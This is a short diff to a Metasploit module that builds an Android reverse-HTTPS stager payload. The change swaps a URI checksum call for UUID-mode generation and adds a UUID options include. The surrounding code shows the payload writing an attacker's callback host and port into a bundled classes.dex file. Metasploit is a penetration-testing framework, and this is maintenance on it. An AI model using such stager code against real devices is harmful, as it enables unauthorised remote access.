@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/uuid_options'
 
 module Metasploit3
 
@@ -12,6 +13,7 @@ module Metasploit3
 
   include Msf::Payload::Stager
   include Msf::Payload::Dalvik
+  include Msf::Payload::UUIDOptions
 
   def initialize(info = {})
     super(merge_info(info,
@@ -37,7 +39,7 @@ module Metasploit3
     lurl = "ZZZZhttps://#{datastore["LHOST"]}"
     lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
     lurl << "/"
-    lurl << generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ, uri_req_len)
+    lurl << generate_uri_uuid_mode(:init_java, uri_req_len)
 
     classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
     string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)
